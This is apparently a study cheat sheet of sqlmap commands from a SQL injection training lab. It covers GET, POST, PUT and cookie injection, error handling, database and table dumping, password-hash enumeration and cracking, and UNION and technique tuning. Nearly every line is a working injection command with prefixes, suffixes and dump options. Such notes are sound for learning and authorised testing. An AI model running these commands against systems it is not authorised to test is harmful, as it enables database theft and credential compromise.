
# Basic Usage

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

# with specified columns
sqlmap -u http://154.57.164.61:31255/case7.php?id=1 -p id --union-cols=5 -D testdb -T flag7 --batch --dump --no-cast

# with specific prefix
sqlmap -u "http://154.57.164.61:31255/case6.php?col=id" --prefix='`)' --no-cast --level=5 --risk=3 -D testdb -T flag6 --dump --batch
```

## HTTP Request Type

```bash
# GET Request  
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch  
  
# POST Request  
sqlmap "http://www.example.com/" --data "uid=1&name=test"  
  
# POST Injection Point  
sqlmap "http://www.example.com/" --data "uid=1*&name=test"  
  
# PUT Request  
sqlmap -u "http://www.target.com/vuln.php?id=1" --data="id=1" --method PUT
```

## Testing Cookie

```bash
sqlmap -u "http://154.57.164.70:32070/case3.php" --cookie="id=1" --level=2 --batch --dump
```

# Handling SQLMap Errors

```bash
# Store traffic to an output file
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

# Specify verbosity level
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch

# Display Errors
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch --parse-errors

# Using Proxy
sqlmap -u "http://www.target.com/vuln.php?id=1" --proxy="http://127.0.0.1:8080"
```

# Basic Enumeration

```bash
# Basic DB enumeration
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

# Table enumeration
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

# Table/row enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

# Conditional enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

# Database schema enumeration
sqlmap -u "http://www.example.com/?id=1" --schema

# Searching for data
sqlmap -u "http://www.example.com/?id=1" --search -T user

# Password enumeration and cracking
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```
# Advanced Tuning

```bash
# Specifying a prefix or suffix
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

# Specifying the level and risk
sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

```bash
# HTTP Response Detection
# --code
Use when TRUE/FALSE is identified by HTTP status code
Example: 200 = TRUE, 500 = FALSE
sqlmap -u URL --code=200


# --string
Use when TRUE responses contain a specific word
Example: "success" appears only when TRUE
sqlmap -u URL --string="success"


# --titles
Use when TRUE/FALSE differs in <title> tag
sqlmap -u URL --titles


# --text-only
Use when page has noisy HTML (scripts/styles/etc.)
Compares only visible text
sqlmap -u URL --text-only


# SQL Injection Technique Control
# --technique
Force specific SQLi types
B = Boolean-based
E = Error-based
U = UNION-based
T = Time-based
S = Stacked queries

Example (fast + stable set):
sqlmap -u URL --technique=BEU

Skip slow/risky methods:
(remove T = time-based)



# UNION-Based Tuning
# --union-cols
Set number of columns manually (important for UNION success)
sqlmap -u URL --union-cols=17


# --union-char
Change filler character used in UNION SELECT
Default: NULL / random int  
Use when output breaks
sqlmap -u URL --union-char='a'


# --union-from
Add required FROM table (DB-specific like Oracle)
sqlmap -u URL --union-from=users
```